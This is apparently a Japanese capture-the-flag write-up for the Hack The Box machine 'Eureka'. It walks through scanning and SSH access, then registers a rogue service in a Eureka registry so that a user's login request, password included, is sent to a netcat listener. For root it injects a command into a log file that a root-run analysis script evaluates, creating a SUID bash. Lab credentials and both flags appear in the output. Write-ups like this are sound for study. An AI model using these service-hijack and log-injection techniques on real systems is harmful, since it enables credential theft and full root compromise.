# Eureka

Linux · Hard

# 初期調査
## nmap

```
┌──(kali㉿kali)-[~/htb/Machines/Eureka]
└─$ nmap -sC -sV 10.10.11.66    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 00:12 JST
Nmap scan report for 10.10.11.66
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.24 seconds
```

## 名前解決

```
┌──(kali㉿kali)-[~/htb/Machines/Eureka]
└─$ echo "10.10.11.66 furni.htb" | sudo tee -a /etc/hosts              
[sudo] password for kali: 
10.10.11.66 eureka.htb
```


```
┌──(kali㉿kali)-[~/htb/Machines/Eureka]
└─$ nuclei -u http://furni.htb                                                                  

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Your current nuclei-templates  are outdated. Latest is v10.2.0
[WRN] Found 3 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.2 (latest)                                                                                                                                                                                               
[INF] Current nuclei-templates version:  (outdated)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 25
[INF] Templates loaded for current scan: 7914
[INF] Executing 7518 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 396 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1736 (Reduced 1632 Requests)
[INF] Using Interactsh Server: oast.me
[INF] No results found. Better luck next time!

```


![](image.png)


Eurekaは、マイクロサービス同士が互いを見つけられるようにするためのサービスレジストリです


https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka


# 初期侵入

## SSH

```
└─$ ssh oscar190@furni.htb -L 8761:127.0.0.1:8761
Load key "/home/kali/.ssh/id_rsa": error in libcrypto
oscar190@furni.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-214-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 04 May 2025 03:35:31 PM UTC

  System load:           0.01
  Usage of /:            60.1% of 6.79GB
  Memory usage:          40%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.66
  IPv6 address for eth0: dead:beef::250:56ff:feb0:e0fa


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun May 4 15:35:35 2025 from 10.10.14.6
oscar190@eureka:~$ id
uid=1000(oscar190) gid=1001(oscar190) groups=1001(oscar190)
oscar190@eureka:~$ whoami
oscar190
oscar190@eureka:~$ ls
oscar190@eureka:~$ ls -la
total 32
drwxr-x--- 5 oscar190 oscar190 4096 Apr  1 12:57 .
drwxr-xr-x 4 root     root     4096 Aug  9  2024 ..
lrwxrwxrwx 1 oscar190 oscar190    9 Aug  7  2024 .bash_history -> /dev/null
-rw-r--r-- 1 oscar190 oscar190  220 Aug  1  2024 .bash_logout
-rw-r--r-- 1 oscar190 oscar190 3771 Apr  1 12:57 .bashrc
drwx------ 2 oscar190 oscar190 4096 Aug  1  2024 .cache
drwx------ 3 oscar190 oscar190 4096 Aug  1  2024 .config
drwxrwxr-x 3 oscar190 oscar190 4096 Aug  1  2024 .local
lrwxrwxrwx 1 oscar190 oscar190    9 Aug  7  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 oscar190 oscar190  807 Aug  1  2024 .profile
oscar190@eureka:~$ ss -tuln
Netid    State     Recv-Q    Send-Q            Local Address:Port          Peer Address:Port    Process    
udp      UNCONN    0         0                 127.0.0.53%lo:53                 0.0.0.0:*                  
udp      UNCONN    0         0                             *:60067                    *:*                  
udp      UNCONN    0         0                             *:48605                    *:*                  
udp      UNCONN    0         0                             *:42898                    *:*                  
udp      UNCONN    0         0                             *:39129                    *:*                  
tcp      LISTEN    0         511                     0.0.0.0:80                 0.0.0.0:*                  
tcp      LISTEN    0         4096              127.0.0.53%lo:53                 0.0.0.0:*                  
tcp      LISTEN    0         128                     0.0.0.0:22                 0.0.0.0:*                  
tcp      LISTEN    0         80                    127.0.0.1:3306               0.0.0.0:*                  
tcp      LISTEN    0         4096         [::ffff:127.0.0.1]:8080                     *:*                  
tcp      LISTEN    0         511                        [::]:80                    [::]:*                  
tcp      LISTEN    0         100          [::ffff:127.0.0.1]:8081                     *:*                  
tcp      LISTEN    0         100          [::ffff:127.0.0.1]:8082                     *:*                  
tcp      LISTEN    0         128                        [::]:22                    [::]:*                  
tcp      LISTEN    0         100                           *:8761                     *:* 
```



```
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.6",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.6",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 4444,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```



```
┌──(kali㉿kali)-[~/htb/Machines/Eureka]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.66] 58828
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=ZTJmYTk2YWItNTdhZi00ZDBjLWFmN2MtMjc4ZDI5ODgwNDY0
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:32804"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.xx.xx:4444

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=_k-bYGkGB0prX4fbWrUi5zQLVX-Rv5aFwj0hArSySakux075nXqoAws-YXNGbeTrOZgWhg05eEakjqGopwQXY42ALJoY9C2Y 
```


```
username:EurekaSrvr
password:0scarPWDisTheB3st
```

http://localhost:8761/eureka/apps


![](image-1.png)


```
<application>
<name>USER-MANAGEMENT-SERVICE</name>
<instance>
<instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
<hostName>localhost</hostName>
<app>USER-MANAGEMENT-SERVICE</app>
<ipAddr>10.10.11.66</ipAddr>
<status>UP</status>
<overriddenstatus>UNKNOWN</overriddenstatus>
<port enabled="true">8081</port>
<securePort enabled="false">443</securePort>
<countryId>1</countryId>
<dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
<name>MyOwn</name>
</dataCenterInfo>
```




```
┌──(kali㉿kali)-[~/htb/Machines/Eureka]
└─$ ssh miranda-wise@furni.htb
Load key "/home/kali/.ssh/id_rsa": error in libcrypto
miranda-wise@furni.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-214-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 04 May 2025 04:05:56 PM UTC

  System load:           0.04
  Usage of /:            60.4% of 6.79GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             244
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.66
  IPv6 address for eth0: dead:beef::250:56ff:feb0:e0fa


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 4 16:05:57 2025 from 10.10.14.6
miranda-wise@eureka:~$ id
uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
miranda-wise@eureka:~$ whoami
miranda-wise
miranda-wise@eureka:~$ ls
snap  user.txt
miranda-wise@eureka:~$ cat user.txt 
2c9c5c26531551ca5f8f3239097a3d20
```

## user.txt

`2c9c****************************``

# 権限昇格

```
miranda-wise@eureka:/opt$ ls -la
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
miranda-wise@eureka:/opt$ cat log_analyse.sh 
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

application.logからわかること

成功したログインと失敗したログイン、HTTP ステータスコードの分布、エラーメッセージを抽出するものです。grep と awk を使用してログファイルから特定の情報を抽出し、表示する


/bin/bash を /tmp/bash にコピーし、chmod u+s を使って bash に SUID ビットを設定する

SUID (Set User ID) ビットは、実行者がスクリプトやバイナリを実行する際に、そのプログラムの所有者の権限を使用するように設定される

application.log が書き込み保護されていたため、rm コマンドで削除する

```
iranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log 
rm: remove write-protected regular file 'application.log'? y
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
miranda-wise@eureka:/var/www/web/cloud-gateway/log$ cd ../../../
miranda-wise@eureka:/var/www$ cd ../../tmp
miranda-wise@eureka:/tmp$ ls -la
total 1236
drwxrwxrwt 20 root     root        4096 May  4 16:19 .
drwxr-xr-x 19 root     root        4096 Apr 22 12:47 ..
-rwsr-xr-x  1 root     root     1183448 May  4 16:16 bash
drwxrwxrwt  2 root     root        4096 May  4 15:08 .font-unix
drwxr-xr-x  2 www-data www-data    4096 May  4 15:09 hsperfdata_www-data
drwxrwxrwt  2 root     root        4096 May  4 15:08 .ICE-unix
drwx------  3 root     root        4096 May  4 15:08 snap-private-tmp
drwx------  3 root     root        4096 May  4 15:08 systemd-private-e81e974008ab4dd08394ae18f506ad30-ModemManager.service-7rXaRi                                                                                     
drwx------  3 root     root        4096 May  4 15:08 systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-logind.service-LmKZMf                                                                                   
drwx------  3 root     root        4096 May  4 15:08 systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-resolved.service-7tO2Mf                                                                                 
drwx------  3 root     root        4096 May  4 15:08 systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-timesyncd.service-XymJvg                                                                                
drwxrwxrwt  2 root     root        4096 May  4 15:08 .Test-unix
drwx------  3 www-data www-data    4096 May  4 15:09 tomcat.8081.8447874206630110694
drwx------  3 www-data www-data    4096 May  4 15:10 tomcat.8082.1055460282608879236
drwx------  3 www-data www-data    4096 May  4 15:09 tomcat.8761.6659432202915133628
drwx------  2 www-data www-data    4096 May  4 15:09 tomcat-docbase.8081.237686681632758613
drwx------  2 www-data www-data    4096 May  4 15:10 tomcat-docbase.8082.16489537439635554085
drwx------  2 www-data www-data    4096 May  4 15:09 tomcat-docbase.8761.8567105249793388605
drwx------  2 root     root        4096 May  4 15:11 vmware-root_795-4257200573
drwxrwxrwt  2 root     root        4096 May  4 15:08 .X11-unix
drwxrwxrwt  2 root     root        4096 May  4 15:08 .XIM-unix
```



```
miranda-wise@eureka:/tmp$ ./bash -p
bash-5.0# whoami
root
bash-5.0# ls
bash
hsperfdata_www-data
snap-private-tmp
systemd-private-e81e974008ab4dd08394ae18f506ad30-ModemManager.service-7rXaRi
systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-logind.service-LmKZMf
systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-resolved.service-7tO2Mf
systemd-private-e81e974008ab4dd08394ae18f506ad30-systemd-timesyncd.service-XymJvg
tomcat.8081.8447874206630110694
tomcat.8082.1055460282608879236
tomcat.8761.6659432202915133628
tomcat-docbase.8081.237686681632758613
tomcat-docbase.8082.16489537439635554085
tomcat-docbase.8761.8567105249793388605
vmware-root_795-4257200573
bash-5.0# cat root/root.txt
cat: root/root.txt: No such file or directory
bash-5.0# cd root
bash: cd: root: No such file or directory
bash-5.0# pwd
/tmp
bash-5.0# cd ../
bash-5.0# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
bash-5.0# cd root
bash-5.0# ls
log_analysis.txt  root.txt  snap
bash-5.0# cat root.txt 
902f60bb7a0efb864ac99879f5241c71
```

## root.txt

`902f****************************`